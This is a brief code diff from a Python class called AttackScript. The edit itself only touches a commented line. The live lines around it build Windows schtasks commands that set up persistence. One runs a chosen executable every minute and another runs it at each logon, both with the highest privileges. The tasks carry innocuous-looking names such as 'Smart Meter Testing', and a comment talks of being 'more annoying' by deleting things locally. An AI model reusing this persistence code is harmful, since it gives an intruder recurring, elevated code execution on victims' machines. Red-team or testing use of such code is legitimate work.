@@ -176,7 +176,7 @@ class AttackScript:
             # TODO: Run a native command prompt with task scheduler without cmd window appearing
             # task_name3 = 'Smart Meter Testing 3' # Be even more annoying and run the command locally to delete
 
-            # sch1 = f'schtasks /create /tn "{task_name1}" /tr "cmd /c \"{executable_file_path} {executable_file_parameters}\"" /sc minute /mo 1 /f /rl HIGHEST'
+            #sch1 = f'schtasks /create /tn "{task_name1}" /tr "cmd /c \"{executable_file_path} {executable_file_parameters}\"" /sc minute /mo 1 /f /rl HIGHEST'
             sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
             sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
             # TODO: Test if the task scheduler works.
